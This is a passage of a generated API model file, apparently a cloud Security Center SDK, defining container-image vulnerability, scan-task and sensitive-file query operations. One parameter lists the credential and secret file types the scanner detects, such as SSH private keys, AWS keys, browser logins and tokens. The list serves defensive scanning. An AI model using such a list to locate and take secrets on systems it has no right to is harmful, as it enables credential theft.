      newUuid?: string(name='NewUuid', description='The UUID of the image after image risks are fixed.', example='2fa731681911ae8d1b5f11893ace****'),
      oldTag?: string(name='OldTag', description='The version of the image.', example='centos8.1-ja'),
      oldUuid?: string(name='OldUuid', description='The UUID of the image.', example='2fa731681911ae8d1b5f11893ace****'),
      regionId?: string(name='RegionId', description='The region of the image.', example='cn-hangzhou'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='test-redhat'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace of the image.', example='name-002'),
      status?: int32(name='Status', description='The status of the task. Valid values:

*   **1**: The task is running.
*   **2**: The task is successful.
*   **3**: The task failed.', example='2'),
      taskType?: string(name='TaskType', description='The type of the task. The value is fixed as IMAGE_REPAIR. The value indicates a task that fixes image risks.', example='IMAGE_REPAIR'),
      vulAlias?: string(name='VulAlias', description='The alias of the fixed vulnerability.', example='CVE-2007-5686:rpath_linux Information Disclosure'),
    }
  ](name='BuildTasks', description='The tasks returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of tasks returned on the current page.', example='12'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Default value: **1**', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of tasks returned.', example='12'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='8AC52BBA-85D3-5F64-9B48-D08437CAF916'),
}

model DescribeImageFixTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageFixTaskResponseBody(name='body'),
}

async function describeImageFixTask(request: DescribeImageFixTaskRequest): DescribeImageFixTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageFixTask', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageGroupedVulListRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='High severity vulnerability that affects org.eclipse.jetty:jetty-server', position='Query'),
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the ID of the container cluster.', example='c60b77fe62093480db6164a3c2fa5****', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  cveId?: string(name='CveId', description='The Common Vulnerabilities and Exposures (CVE) ID of the vulnerability.', example='CVE-2017-15420', position='Query'),
  groupId?: string(name='GroupId', description='The ID of the asset group.', example='1311', position='Query'),
  imageDigest?: string(name='ImageDigest', description='The SHA-256 value of the image digest.', example='w213412341dfsfasdfafadfasfasf', position='Query'),
  imageLayer?: string(name='ImageLayer', description='The layer of the image.', example='b1f5b9420803ad0657cf21566e3e20acc08581e7f22991249ef3aa80b8b1c587', position='Query'),
  imageTag?: string(name='ImageTag', description='The tag of the image.', example='oval', position='Query'),
  isLatest?: int32(name='IsLatest', description='Specifies whether to query the vulnerabilities in the latest images. If you do not specify this parameter, the vulnerabilities in all images are queried. Valid values:

*   **0**: does not query the vulnerabilities in the latest images.
*   **1**: queries the vulnerabilities in the latest images.', example='0', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893', position='Query'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **later**: medium. You can fix the vulnerability based on your business requirements.
*   **nntf**: low. You can ignore the vulnerability.', example='asap', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Query'),
  patchId?: long(name='PatchId', description='The ID of the patch that is used to fix the vulnerability.', example='1341512412', position='Query'),
  repoId?: string(name='RepoId', description='The ID of the image repository.', example='qew****', position='Query'),
  repoInstanceId?: string(name='RepoInstanceId', description='The instance ID of the image repository.', example='i-qewqrqcsadf****', position='Query'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='libssh2', position='Query'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2', position='Query'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-hangzhou', position='Query'),
  scanRange?: [ string ](name='ScanRange', description='An array consisting of the types of the assets that you want to scan.', position='Query'),
  type?: string(name='Type', description='The type of the vulnerability that you want to query. Valid values:

*   **cve**: image system vulnerability
*   **sca**: image application vulnerability', example='cve', position='Query'),
  uuids?: string(name='Uuids', description='The UUID of the asset. Separate multiple UUIDs with commas (,).', example='uuid-13134124****', position='Query'),
}

model DescribeImageGroupedVulListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='2'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:3075-Important: wget security update'),
      asapCount?: int32(name='AsapCount', description='The number of vulnerabilities that have the high priority.', example='26'),
      canFix?: string(name='CanFix', description='Indicates whether the vulnerability can be fixed in the Security Center console. Valid values:

*   **yes**
*   **no**', example='yes'),
      gmtLast?: long(name='GmtLast', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1611201274000'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1611201274000'),
      laterCount?: int32(name='LaterCount', description='The number of vulnerabilities that have the medium priority.', example='26'),
      name?: string(name='Name', description='The name of the vulnerability.', example='debian:9:CVE-2019-3858'),
      nntfCount?: int32(name='NntfCount', description='The number of vulnerabilities that have the low priority.', example='29'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: verifying
*   **3**: added to the whitelist', example='0'),
      tags?: string(name='Tags', description='The tag of the vulnerability. Valid values:

*   Restart required
*   Remote exploitation
*   Exploit exists
*   Exploitable
*   Privilege escalation
*   Code execution', example='EXP exists'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: image system vulnerability
*   **sca**: image application vulnerability', example='cve'),
    }
  ](name='GroupedVulItems', description='An array that consists of the image vulnerabilities.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5E244439-UJND-8BF7-26F36E21B9AA'),
  totalCount?: int32(name='TotalCount', description='The total number of image system vulnerabilities.', example='21'),
}

model DescribeImageGroupedVulListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageGroupedVulListResponseBody(name='body'),
}

async function describeImageGroupedVulList(request: DescribeImageGroupedVulListRequest): DescribeImageGroupedVulListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageGroupedVulList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageInfoListRequest {
  uuids: string(name='Uuids', description='The UUID of the server. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~141932~~) operation to query the UUIDs of servers.', example='391abd09184cbd3743d7f5ec125d****,
e6aeb2a5b6004479398b0bcd1160****', position='Query'),
}

model DescribeImageInfoListResponseBody = {
  imageInfos?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts that are generated on the current pod, application, namespace, or cluster.', example='10'),
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated on the asset. Valid values:

*   **YES**
*   **NO**', example='YES'),
      digest?: string(name='Digest', description='The digest value of the image.', example='a3521b04dfdd1361a24be6263f2983cf12ba910989f4d9f7324da7e1e89f****'),
      endpoints?: string(name='Endpoints', description='The endpoint of Container Registry.', example='cn-hangzhou-x7'),
      imageCreate?: long(name='ImageCreate', description='The time when the image was created.', example='1636962328000'),
      imageId?: string(name='ImageId', description='The ID of the image.', example='bb0175afea16138815a8900adeeb0315d88a83a2376eeffa14db1d693a15****'),
      imageSize?: long(name='ImageSize', description='The size of the image.', example='157408623'),
      imageUpdate?: long(name='ImageUpdate', description='The time when the image was updated.', example='1636974116000'),
      instanceId?: string(name='InstanceId', description='The ID of the image instance.', example='i-wz95abw6pa7y79ve****'),
      regionId?: string(name='RegionId', description='The region ID of the image instance.', example='cn-hangzhou'),
      registryType?: string(name='RegistryType', description='The type of the registration.', example='harbor'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-5qk9v2rdt0s****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='opa-test'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
      repoType?: string(name='RepoType', description='The type of the image repository. Valid values:

*   `PUBLIC`
*   `PRIVATE`', example='PUBLIC'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether the image is at risk. Valid values:

*   **YES**
*   **NO**', example='YES'),
      status?: string(name='Status', description='The status of the image.', example='NORMAL'),
      tag?: string(name='Tag', description='The tag that is added to the image.', example='v1'),
      tagImmutable?: int32(name='TagImmutable', description='The tag immutability.', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='ff9ca084-7faa-4ab2-8728-69024755****'),
      vulCount?: int32(name='VulCount', description='The total number of vulnerabilities in your assets.', example='1'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='YES'),
    }
  ](name='ImageInfos', description='An array that consists of the information about images.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BC3B0DAE-CC0E-59E9-9383-6F060F22****'),
}

model DescribeImageInfoListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageInfoListResponseBody(name='body'),
}

async function describeImageInfoList(request: DescribeImageInfoListRequest): DescribeImageInfoListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageInfoList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageInstancesRequest {
  criteria?: string(name='Criteria', description='The search condition that is used to filter the server. The value of this parameter is in the JSON format and contains the following fields:

*   **name**: the search condition

*   **name**: the value of the search condition

*   **logicalExp**: the logical relation for multiple search conditions Valid values:

    *   **OR**: The search conditions use a logical **OR**.
    *   **AND**: The search conditions use a logical **AND**.

> You can call the [DescribeImageCriteria](~~471822~~) operation to query the supported search conditions.', example='[{"name":"instanceId","value":"390100182","logicalExp":"AND"}]', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1', position='Query'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship that you want to use to evaluate multiple search conditions. Valid values:

*   **OR**: The search conditions are evaluated by using a logical **OR**.
*   **AND**: The search conditions are evaluated by using a logical **AND**.', example='OR', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> : We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  scanned?: boolean(name='Scanned', description='Specifies whether the image is scanned. Valid values:

*   **true**
*   **false**', example='true', position='Query'),
}

model DescribeImageInstancesResponseBody = {
  imageInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts that are generated for the image.', example='0'),
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated for the image. Valid values:

*   **YES**
*   **NO**', example='NO'),
      deployed?: int32(name='Deployed', description='Indicates whether the image was deployed. Valid values:

*   **0**: The image was not deployed.
*   **1**: The image was deployed.', example='1'),
      digest?: string(name='Digest', description='The digest value of the image.', example='a5ccdd9b166b67e02954aa9b618fe19b7968bd56a15463d2ad7f2643ba5b****'),
      endpoints?: string(name='Endpoints', description='The address of the image.', example='[]'),
      hcCount?: int32(name='HcCount', description='The number of baseline risks.', example='0'),
      hcStatus?: string(name='HcStatus', description='Indicates whether the baseline risks exist. Valid values:

*   **NO**
*   **YES**', example='NO'),
      imageCreate?: string(name='ImageCreate', description='The timestamp generated when the image was created. Unit: milliseconds.', example='1600069948849'),
      imageId?: string(name='ImageId', description='The image ID.', example='c20987f18b130f9d144c9828df630417e2a9523148930dc3963e9d0dab30****'),
      imageSize?: string(name='ImageSize', description='The size of the image. Unit: MB.', example='1604487690'),
      imageUpdate?: string(name='ImageUpdate', description='The timestamp generated when the image was updated. Unit: milliseconds.', example='1600069948849'),
      instanceId?: string(name='InstanceId', description='The ID of the image.', example='39010****'),
      regionId?: string(name='RegionId', description='The ID of the region in which the image resides.', example='cn-hangzhou'),
      registryType?: string(name='RegistryType', description='The type of the image. Valid values:

*   **acr**
*   **harbor**
*   **quay**
*   **CI/CD**', example='acr'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='f2b86d20bf0855af6aa268ce90fd****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='sas-script-test'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='N/A'),
      repoType?: string(name='RepoType', description='The type of the repository. Valid values:

*   **private**
*   **public**', example='private'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks exist. Valid values:

*   **NO**
*   **YES**', example='NO'),
      scaProgress?: int32(name='ScaProgress', description='The scan progress of the image. Valid values: 0 to 100.', example='100'),
      scaResult?: string(name='ScaResult', description='The error code of the image scan result. Valid values:

*   **TASK_NOT_EXISTS**: The image scan task does not exist.
*   **TASK_NOT_SUPPORT_REGION**: The image scan task cannot be performed in the current region.
*   **forbid_create_repeat_task**: The image scan task already exists.', example='TASK_NOT_SUPPORT_REGION'),
      scaStatus?: string(name='ScaStatus', description='The scan status of the image. Valid values:

*   **INIT**: The image scan task is pending startup.
*   **START**: The image scan task is started.
*   **MESSAGE_SEND**: The message about the image scan task is sent.
*   **START_RUN**: The image analysis task is started.
*   **DOWNLOAD**: The image scan result is downloaded.
*   **PRE_ANALYZER**: The image pre-analysis is started.
*   **WEB_SHELL_ANALYZER**: The WebShell analysis is complete.
*   **CVE_ANALYZER**: The Common Vulnerabilities and Exposures (CVE) analysis is complete.
*   **BIN_ANALYZER**: The binary analysis of the image is complete.
*   **OTHER_ANALYZER**: The extended analysis of the image is complete.
*   **SUCCESS**: The image scan task is complete.
*   **PRE_ANALYZER_SUCCESS**: The image pre-analysis is complete.
*   **FAIL**: The image scan task failed.
*   **TIMEOUT**: The image scan task timed out.', example='SUCCESS'),
      status?: string(name='Status', description='The status of the image. Valid value:

*   **NORMAL**', example='NORMAL'),
      tag?: string(name='Tag', description='The tag of the image.', example='mysql_5.7'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='12f80307-60aa-4efa-863a-56d72fb****'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities in the image.', example='0'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities exist in the image. Valid values:

*   **YES**
*   **NO**', example='NO'),
    }
  ](name='ImageInstanceList', description='An array that consists of the information about the image.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of images returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of returned entries.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DescribeImageInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageInstancesResponseBody(name='body'),
}

async function describeImageInstances(request: DescribeImageInstancesRequest): DescribeImageInstancesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageInstances', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageLatestScanTaskRequest {
  digest: string(name='Digest', description='The digest value of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d50****', position='Query'),
}

model DescribeImageLatestScanTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
  task?: [ 
    {
      create?: string(name='Create', description='The time when the task was created. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-12-20 11:59:05'),
      finish?: int32(name='Finish', description='The number of images that are scanned.', example='100'),
      finishTime?: long(name='FinishTime', description='The end time of the task. A value is returned only when the task is in the Finished state. Otherwise, the returned value is empty.', example='1669693430977'),
      id?: long(name='Id', description='The task ID.', example='9755662'),
      modified?: string(name='Modified', description='The time when the task was last modified. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-12-20 12:00:05'),
      name?: string(name='Name', description='The name of the task.', example='IMAGE_SCAN'),
      source?: string(name='Source', description='The method in which the task was created. A task can be created in the Security Center console or by calling an API operation. Valid values:

*   **console_batch**: The task was created in the Security Center console.
*   **openapi**: The task was created by calling an API operation.', example='console_batch'),
      startTime?: long(name='StartTime', description='The start time of the task.', example='1668614400000'),
      status?: string(name='Status', description='The status of the task. Valid value:

*   **PROCESSING**: The task is running.
*   **START**: The task is being started.
*   **MESSAGE_SEND**: The scan task is sent.
*   **PRE_ANALYZER**: The image is in precheck.
*   **SUCCESS**: The task was successful.
*   **FAIL**: The task failed.
*   **TIMOUT**: The task timed out.', example='SUCCESS'),
      target?: string(name='Target', description='The digest value of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d50****'),
      targetType?: string(name='TargetType', description='The type of the scanned asset. Valid value:

*   **IMAGE**', example='IMAGE'),
      taskId?: string(name='TaskId', description='The ID of the scan task.', example='0a960b9a48b788a8689154b032bf****'),
      taskType?: string(name='TaskType', description='The type of the task. Valid value:

*   **IMAGE_SCAN**', example='IMAGE_SCAN'),
    }
  ](name='Task', description='An array that consists of the information about the task.'),
}

model DescribeImageLatestScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageLatestScanTaskResponseBody(name='body'),
}

async function describeImageLatestScanTask(request: DescribeImageLatestScanTaskRequest): DescribeImageLatestScanTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageLatestScanTask', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageListBySensitiveFileRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1', position='Query'),
  imageDigest?: string(name='ImageDigest', description='The image digest.
> Fuzzy match is supported.', example='v005', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20', position='Query'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the specified container image.

> You can call the [ListRepository](~~451339~~) operation to obtain the IDs of container images from the value of the **InstanceId** response parameter.', example='i-qewqrqcsadf****', position='Query'),
  repoName?: string(name='RepoName', description='The name of the image repository.

> Fuzzy match is supported.', example='harbor-image-v001', position='Query'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.
> Fuzzy match is supported.', example='libssh2', position='Query'),
  riskLevel?: string(name='RiskLevel', description='The risk level of the file. Separate multiple levels with commas (,). Valid values:

- **high**
- **medium**
- **low**', example='high', position='Query'),
  scanRange?: [ string ](name='ScanRange', description='An array consisting of the types of the assets that you want to scan. Valid values:
- **image**
- **container**', shrink='json', position='Query'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The type of the alert for the sensitive file. Valid values:

*   **npm_token**: npm access token.
*   **ftp_cfg**: FTP configuration.
*   **google_oauth_key**: Google OAuth key.
*   **planetscale_passwd**: PlanetScale password.
*   **github_ssh_key**: Github SSH key.
*   **msbuild_publish_profile**: MSBuild publish profile.
*   **fastly_cdn_token**: Fastly CDN token.
*   **ssh_private_key**: SSH private key.
*   **aws_cli**: Amazon Web Services (AWS) CLI credential.
*   **cpanel_proftpd**: cPanel ProFTPD credential.
*   **postgresql_passwd**: PostgreSQL password file.
*   **discord_client_cred**: Discord client credential.
*   **rails_database**: Rails database configuration.
*   **aws_access_key**: AWS access key.
*   **esmtp_cfg**: configuration of mail server over Extended Simple Mail Transfer Protocol (ESMTP).
*   **docker_registry_cfg**: configuration of a Docker image repository.
*   **pem**: Privacy-Enhanced Mail (PEM).
*   **common_cred**: common credential.
*   **sftp_cfg**: configuration of connection over Secure File Transfer Protocol (SFTP).
*   **grafana_token**: Grafana token.
*   **slack_token**: Slack token.
*   **ec_private_key**: Elliptic Curve (EC) private key.
*   **pypi_token**: Python Package Index (PyPI) token.
*   **finicity_token**: Finicity token.
*   **k8s_client_key**: private key for the Kubernetes client.
*   **git_cfg**: Git configuration.
*   **django_key**: Django key.
*   **jenkins_ssh**: SSH configuration file for Jenkins.
*   **openssh_private_key**: OpenSSH private key.
*   **square_oauth**: Square OAuth credential.
*   **typeform_token**: Typeform token.
*   **common_database_cfg**: configuration of general database connection.
*   **wordpress_database_cfg**: WordPress database configuration.
*   **googlecloud_api_key**: API key for Google Cloud.
*   **vscode_sftp**: VSCode SFTP configuration.
*   **apache_htpasswd**: Apache htpasswd.
*   **planetscale_token**: PlanetScale token.
*   **contentful_preview_token**: preview token for Contentful.
*   **php_database_cfg**: database password for a PHP application.
*   **atom_remote_sync**: Atom remote synchronization configuration.
*   **aws_session_token**: AWS session token.
*   **atom_sftp_cfg**: Atom SFTP configuration.
*   **asana_client_private_key**: private key for the Asana client.
*   **tencentcloud_ak**: secret ID of a third-party cloud.
*   **rsa_private_key**: Rivest-Shamir-Adleman (RSA) private key.
*   **github_personal_token**: personal access token for GitHub.
*   **pgp**: Pretty Good Privacy (PGP) encrypted file.
*   **stripe_skpk**: Stripe secret key.
*   **square_token**: Square access token.
*   **rails_carrierwave**: Rails Carrierwave credential.
*   **dbeaver_database_cfg**: DBeaver database configuration.
*   **robomongo_cred**: RoboMongo credential.
*   **github_oauth_token**: OAuth access token for GitHub.
*   **pulumi_token**: Pulumi token.
*   **ventrilo_voip**: configuration of a Ventrilo VoIP server.
*   **macos_keychain**: macOS keychain.
*   **amazon_mws_token**: Amazon MWS token.
*   **dynatrace_token**: Dynatrace token.
*   **java_keystore**: Java KeyStore (JKS).
*   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database.
*   **kubernetes_dashboard_cred**: user credential for Kubernetes Dashboard.
*   **atlassian_token**: Atlassian token.
*   **rdp**: remote desktop protocol (RDP).
*   **mailgun_key**: Mailgun webhook signing key.
*   **mailchimp_api_key**: API key for Mailchimp.
*   **netrc_cfg**: .netrc configuration file.
*   **openvpn_cfg**: configuration of the OpenVPN client.
*   **github_refresh_token**: GitHub refresh token.
*   **salesforce**: Salesforce credential.
*   **salesforce**: Sendinblue token.
*   **pkcs_private_key**: PKCS#12 private key.
*   **rubyonrails_passwd**: Ruby on Rails password file.
*   **filezilla_ftp**: FileZilla FTP configuration.
*   **databricks_token**: Databricks token.
*   **gitLab_personal_toke**: personal access token for GitLab.
*   **rails_master_key**: Rails master key.
*   **sqlite**: SQLite3 or SQLite database.
*   **firefox_logins**: Firefox logon configuration.
*   **mailgun_private_token**: Mailgun private token.
*   **joomla_cfg**: Joomla configuration.
*   **hashicorp_terraform_token**: HashiCorp Terraform token.
*   **jetbrains_ides**: JetBrains IDEs configuration.
*   **heroku_api_key**: API key for Heroku.
*   **messagebird_token**: MessageBird token.
*   **github_app_token**: Github app token.
*   **hashicorp_vault_token**: HashiCorp Vault token.
*   **pgp_private_key**: PGP private key.
*   **sshpasswd**: SSH password.
*   **huaweicloud_ak**: secret access key of a third-party cloud.
*   **aws_s3cmd**: AWS S3cmd configuration.
*   **php_config**: PHP configuration.
*   **common_private_key**: common private key.
*   **microsoft_mdf**: Microsoft SQL Server database.
*   **mediawiki_cfg**: MediaWiki configuration.
*   **jenkins_cred**: Jenkins credential.
*   **rubygems_cred**: RubyGems credential.
*   **clojars_token**: Clojars token.
*   **phoenix_web_passwd**: Phoenix web credential.
*   **puttygen_private_key**: PuTTYgen private key.
*   **google_oauth_token**: Google OAuth access token.
*   **rubyonrails_cfg**: Ruby On Rails database configuration.
*   **lob_api_key**: Lob API key for Lob.
*   **pkcs_cred**: PKCS#12 certificate.
*   **otr_private_key**: Off-the-Record Messaging (OTR) private key.
*   **contentful_delivery_token**: Contentful delivery token.
*   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration.
*   **dsa_private_key**: Digital Signature Algorithm (DSA) private key.
*   **rails_app_token**: app token for Rails.
*   **git_cred**: user credential for Git.
*   **newrelic_api_key**: User API key for New Relic.
*   **github_hub**: hub configuration for storing GitHub tokens.
*   **rubygem**: RubyGem token.', example='sshpasswd', position='Query'),
  status?: string(name='Status', position='Query'),
}

model DescribeImageListBySensitiveFileResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  imageInfos?: [ 
    {
      digest?: string(name='Digest', description='The digest of the image.', example='v005'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1649814050000'),
      instanceId?: string(name='InstanceId', description='The ID of the image instance.', example='cri-a595qp31knh9****'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1649814050000'),
      regionId?: string(name='RegionId', description='The ID of the region in which the image instance resides.', example='cn-hangzhou'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='opa-test'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
      status?: string(name='Status'),
      tag?: string(name='Tag', description='The tag of the image.', example='nuxeo6'),
      uuid?: string(name='Uuid', description='The UUID of the image.', example='f58681174f944623345379e23b7b****'),
    }
  ](name='ImageInfos', description='The information about the images.'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4NjE='),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 20.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='83'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E0C5C07F-1576-509A-AE44-1C36B8445B37'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:
- **true**: The request was successful.
- **false**: The request failed.', example='true'),
}

model DescribeImageListBySensitiveFileResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageListBySensitiveFileResponseBody(name='body'),
}

async function describeImageListBySensitiveFile(request: DescribeImageListBySensitiveFileRequest): DescribeImageListBySensitiveFileResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageListBySensitiveFile', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageListWithBaselineNameRequest {
  baselineNameKey: string(name='BaselineNameKey', description='The name of the image baseline.', example='ak_leak', position='Query'),
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='cc20a1024011c44b6a8710d6f8b****', position='Query'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law', position='Query'),
  containerId?: string(name='ContainerId', description='The ID of the container.', example='c08d5fc1a329a4b88950a253d082f****', position='Query'),
  criteria?: string(name='Criteria', description='The search condition for the image baseline.', example='Unauthorized access', position='Query'),
  criteriaType?: string(name='CriteriaType', description='The type of the search condition. Valid values:

*   **BaselineNameAlias**: baseline name
*   **BaselineClassAlias**: baseline category', example='BaselineNameAlias', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  image?: string(name='Image', description='The name of the image to which the container belongs.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****', position='Query'),
  imageDigest?: string(name='ImageDigest', description='The SHA-256 value of the image digest.', example='2e6daffce524ffeae66cccaa90c8fc47de912346dcec295c27395b6d66db6423', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-002', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10', position='Query'),
  pod?: string(name='Pod', description='The pod.', example='22222-7xsqq', position='Query'),
  repoInstanceId?: string(name='RepoInstanceId', description='The instance ID of the image repository.', example='i-qewqrqcsadf****', position='Query'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='libssh2', position='Query'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2', position='Query'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.', position='Query'),
}

model DescribeImageListWithBaselineNameResponseBody = {
  imageInfos?: [ 
    {
